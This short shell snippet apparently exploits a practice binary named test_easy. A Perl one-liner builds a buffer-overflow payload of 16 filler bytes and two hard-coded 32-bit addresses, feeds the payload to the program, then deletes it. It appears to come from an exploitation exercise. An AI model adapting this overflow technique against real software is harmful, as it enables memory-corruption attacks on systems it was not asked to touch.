perl -e 'print "A"x16 . "\x00\xa0\x04\x08" . "\x38\x85\x04\x08"' > payload
./test/test_easy payload
rm payload
